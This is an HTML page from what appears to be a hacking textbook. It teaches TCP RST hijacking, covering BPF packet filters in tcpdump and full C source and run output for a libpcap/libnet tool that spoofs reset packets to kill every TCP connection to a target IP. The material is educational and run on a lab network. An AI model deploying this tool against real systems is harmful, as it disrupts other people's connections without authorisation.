<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x461 RST Hijacking</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part99.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part101.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: justify;"><a name="bookmark89">0x461 RST Hijacking</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">A very simple form of TCP/IP hijacking involves injecting an authentic-looking reset (RST) packet. If the source is spoofed and the acknowledgment number is correct, the receiving side will believe that the source actually sent the reset packet, and the connection will be reset.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Imagine a program to perform this attack on a target IP. At a high level, it would sniff using libpcap, then inject RST packets using libnet. Such a program doesn’t need to look at every packet but only at established TCP connections to the target IP. Many other programs that use libpcap also don’t need to look at every single packet, so libpcap provides a way to tell the kernel to only send certain packets that match a filter. This filter, known as a Berkeley Packet Filter (BPF), is very similar to a program. For example, the filter rule to filter for a destination IP of 192.168.42.88 is <span class="s31">&quot;dst host 192.168.42.88&quot;</span>. Like</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">a program, this rule consists of keyword and must be compiled before it’s actually sent to the kernel. The tcpdump program uses BPFs to filter what it captures; it also provides a mode to dump the filter program.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_767.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ sudo tcpdump -d &quot;dst host 192.168.42.88&quot;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(000) ldh   [12]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(001) jeq   #0x800     jt 2  jf 4</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(002) ld   [30]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(003) jeq   #0xc0a82a58   jt 8  jf 9</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(004) jeq   #0x806     jt 6  jf 5</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(005) jeq   #0x8035     jt 6  jf 9</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(006) ld   [38]</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(007) jeq   #0xc0a82a58   jt 8  jf 9</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(008) ret   #96</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(009) ret   #0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ sudo tcpdump -ddd &quot;dst host 192.168.42.88&quot; 10</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">40 0 0 12</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">21 0 2 2048</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">32 0 0 30</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">21 4 5 3232246360</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">21 1 0 2054</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">21 0 3 32821</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">32 0 0 38</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">21 0 1 3232246360</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 0 0 96</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">6 0 0 0</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_768.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">After the filter rule is compiled, it can be passed to the kernel for filter- ing. Filtering for established connections is a bit more complicated. All established connections will have the ACK flag set, so this is what we should look for. The TCP flags are found in the 13th octet of the TCP header. The</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">flags are found in the following order, from left to right: URG, ACK, PSH, RST, SYN, and FIN. This means that if the ACK flag is turned on, the 13th octet would be <span class="s31">00010000 </span>in binary, which is 16 in decimal. If both SYN and ACK are turned on, the 13th octet would be <span class="s31">00010010 </span>in binary, which is 18 in decimal.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In order to create a filter that matches when the ACK flag is turned on without caring about any of the other bits, the bitwise AND operator is used. ANDing <span class="s31">00010010 </span>with <span class="s31">00010000 </span>will produce <span class="s31">00010000</span>, since the ACK bit is the only bit where both bits are <span class="s31">1</span>. This means that a filter of <span class="s31">tcp[13] &amp; 16 == 16 </span>will match the packets where the ACK flag is turned on, regardless of the state of the remaining flags.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">This filter rule can be rewritten using named values and inverted logic as <span class="s31">tcp[tcpflags] &amp; tcp-ack != 0</span>. This is easier to read but still provides the same result. This rule can be combined with the previous destination IP rule using and logic; the full rule is shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_769.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ sudo tcpdump -nl &quot;tcp[tcpflags] &amp; tcp-ack != 0 and dst host 192.168.42.88&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes 10:19:47.567378 IP 192.168.42.72.40238 &gt; 192.168.42.88.22: . ack 2777534975 win 92</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;nop,nop,timestamp 85838571 0&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">10:19:47.770276 IP 192.168.42.72.40238 &gt; 192.168.42.88.22: . ack 22 win 92 &lt;nop,nop,timestamp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">85838621 29399&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">10:19:47.770322 IP 192.168.42.72.40238 &gt; 192.168.42.88.22: P 0:20(20) ack 22 win 92</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;nop,nop,timestamp 85838621 29399&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">10:19:47.771536 IP 192.168.42.72.40238 &gt; 192.168.42.88.22: P 20:732(712) ack 766 win 115</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;nop,nop,timestamp 85838622 29399&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">10:19:47.918866 IP 192.168.42.72.40238 &gt; 192.168.42.88.22: P 732:756(24) ack 766 win 115</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;nop,nop,timestamp 85838659 29402&gt;</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_770.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">A similar rule is used in the following program to filter the packets libpcap sniffs. When the program gets a packet, the header information is used to spoof a RST packet. This program will be explained as it’s listed.</p><p class="s40" style="padding-top: 8pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">rst_hijack.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_771.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">#include &lt;libnet.h&gt; #include &lt;pcap.h&gt; #include &quot;hacking.h&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *); int set_packet_filter(pcap_t *, struct in_addr *);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 107%;text-align: left;">struct data_pass { int libnet_handle; u_char *packet;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">};</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 106%;text-align: left;">int main(int argc, char *argv[]) { struct pcap_pkthdr cap_header; const u_char *packet, *pkt_data; pcap_t *pcap_handle;</p><p class="s31" style="padding-top: 2pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">char errbuf[PCAP_ERRBUF_SIZE]; // Same size as LIBNET_ERRBUF_SIZE char *device;</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">u_long target_ip; int network;</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">struct data_pass critical_libnet_data;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">if(argc &lt; 1) {</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;Usage: %s &lt;target IP&gt;\n&quot;, argv[0]); exit(0);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 44pt;text-indent: -12pt;text-align: left;">if (target_ip == -1) fatal(&quot;Invalid target address&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">device = pcap_lookupdev(errbuf); if(device == NULL)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fatal(errbuf);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf); if(pcap_handle == NULL)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fatal(errbuf);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW); if(critical_libnet_data.libnet_handle == -1)</p><p class="s31" style="padding-left: 19pt;text-indent: 25pt;text-align: left;">libnet_error(LIBNET_ERR_FATAL, &quot;can&#39;t open network interface. -- this program must run as root.\n&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &amp;(critical_libnet_data.packet)); if (critical_libnet_data.packet == NULL)</p><p class="s31" style="padding-left: 32pt;text-indent: 12pt;line-height: 212%;text-align: left;">libnet_error(LIBNET_ERR_FATAL, &quot;can&#39;t initialize packet memory.\n&quot;); libnet_seed_prand();</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">set_packet_filter(pcap_handle, (struct in_addr *)&amp;target_ip);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;Resetting all TCP connections to %s on %s\n&quot;, argv[1], device); pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&amp;critical_libnet_data);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">pcap_close(pcap_handle);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_772.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The majority of this program should make sense to you. In the beginning, a <span class="s31">data_pass </span>structure is defined, which is used to pass data through the libpcap callback. libnet is used to open a raw socket interface and to allocate packet memory. The file descriptor for the raw socket and a pointer to the packet memory will be needed in the callback function, so this critical libnet data is stored in its own structure. The final argument to the <span class="s31">pcap_loop() </span>call is user pointer, which is passed directly to the callback function. By passing a pointer to the <span class="s31">critical_libnet_data </span>structure, the callback function will have access to everything in this structure. Also, the snap length value used in <span class="s31">pcap_open_live() </span>has been reduced from <span class="s31">4096 </span>to <span class="s31">128</span>, since the information needed from the packet is just in the headers.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_773.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">/* Sets a packet filter to look for established TCP connections to target_ip */ int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {</p><p class="s31" style="padding-left: 31pt;text-indent: 0pt;line-height: 107%;text-align: left;">struct bpf_program filter; char filter_string[100];</p><p class="s31" style="padding-top: 1pt;padding-left: 31pt;text-indent: 0pt;line-height: 21pt;text-align: left;">sprintf(filter_string, &quot;tcp[tcpflags] &amp; tcp-ack != 0 and dst host %s&quot;, inet_ntoa(*target_ip)); printf(&quot;DEBUG: filter string is \&#39;%s\&#39;\n&quot;, filter_string);</p><p class="s31" style="padding-left: 31pt;text-indent: 0pt;line-height: 8pt;text-align: left;">if(pcap_compile(pcap_hdl, &amp;filter, filter_string, 0, 0) == -1)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">fatal(&quot;pcap_compile failed&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 44pt;text-indent: -12pt;text-align: left;">if(pcap_setfilter(pcap_hdl, &amp;filter) == -1) fatal(&quot;pcap_setfilter failed&quot;);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_774.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The next function compiles and sets the BPF to only accept packets from established connections to the target IP. The <span class="s31">sprintf() </span>function is just a <span class="s31">printf() </span>that prints to a string.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_775.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">*packet) {</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">u_char *pkt_data;</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">struct libnet_ip_hdr *IPhdr; struct libnet_tcp_hdr *TCPhdr; struct data_pass *passed;</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">int bcount;</p><p class="s31" style="padding-top: 2pt;padding-left: 32pt;text-indent: 0pt;line-height: 21pt;text-align: left;">passed = (struct data_pass *) user_args; // Pass data using a pointer to a struct. IPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 8pt;text-align: left;">TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 57pt;text-indent: -25pt;line-height: 107%;text-align: left;">printf(&quot;resetting TCP connection from %s:%d &quot;, inet_ntoa(IPhdr-&gt;ip_src), htons(TCPhdr-&gt;th_sport));</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">printf(&quot;&lt;---&gt; %s:%d\n&quot;,</p><p class="s31" style="padding-left: 32pt;text-indent: 25pt;line-height: 107%;text-align: left;">inet_ntoa(IPhdr-&gt;ip_dst), htons(TCPhdr-&gt;th_dport)); libnet_build_ip(LIBNET_TCP_H,   // Size of the packet sans IP header</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">IPTOS_LOWDELAY,       // IP tos</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 107%;text-align: left;">libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) 0,               // Frag stuff</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 107%;text-align: left;">libnet_get_prand(LIBNET_PR8),  // TTL (randomized) IPPROTO_TCP,          // Transport protocol</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 10pt;text-align: left;">*((u_long *)&amp;(IPhdr-&gt;ip_dst)), // Source IP (pretend we are dst)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;line-height: 107%;text-align: left;">*((u_long *)&amp;(IPhdr-&gt;ip_src)),  // Destination IP (send back to src) NULL,               // Payload (none)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">0,               // Payload length</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">passed-&gt;packet);        // Packet header memory</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 44pt;text-indent: -12pt;line-height: 106%;text-align: left;">libnet_build_tcp(htons(TCPhdr-&gt;th_dport), // Source TCP port (pretend we are dst) htons(TCPhdr-&gt;th_sport),     // Destination TCP port (send back to src) htonl(TCPhdr-&gt;th_ack),      // Sequence number (use previous ack) libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)</p><p class="s31" style="padding-top: 2pt;padding-left: 44pt;text-indent: 0pt;text-align: left;">TH_RST,            // Control flags (RST flag set only) libnet_get_prand(LIBNET_PRu16), // Window size (randomized)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">0,               // Urgent pointer</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">NULL,              // Payload (none)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">0,               // Payload length</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">(passed-&gt;packet) + LIBNET_IP_H);// Packet header memory</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 44pt;text-indent: -12pt;line-height: 107%;text-align: left;">if (libnet_do_checksum(passed-&gt;packet, IPPROTO_TCP, LIBNET_TCP_H) == -1) libnet_error(LIBNET_ERR_FATAL, &quot;can&#39;t compute checksum\n&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">bcount = libnet_write_ip(passed-&gt;libnet_handle, passed-&gt;packet, LIBNET_IP_H+LIBNET_TCP_H); if (bcount &lt; LIBNET_IP_H + LIBNET_TCP_H)</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">libnet_error(LIBNET_ERR_WARNING, &quot;Warning: Incomplete packet written.&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">usleep(5000); // pause slightly</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_776.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The callback function spoofs the RST packets. First, the critical libnet data is retrieved, and pointers to the IP and TCP headers are set using the structures included with libnet. We could use our own structures from hacking-network.h, but the libnet structures are already there and compensate for the host’s</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">byte ordering. The spoofed RST packet uses the sniffed source address as the destination, and vice versa. The sniffed sequence number is used as the spoofed packet’s acknowledgment number, since that is what is expected.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_777.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o rst_hijack rst_hijack.c -lnet -lpcap reader@hacking:~/booksrc $ sudo ./rst_hijack 192.168.42.88</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">DEBUG: filter string is &#39;tcp[tcpflags] &amp; tcp-ack != 0 and dst host 192.168.42.88&#39;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Resetting all TCP connections to 192.168.42.88 on eth0</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">resetting TCP connection from 192.168.42.72:47783 &lt;---&gt; 192.168.42.88:22</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_778.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part99.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part101.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
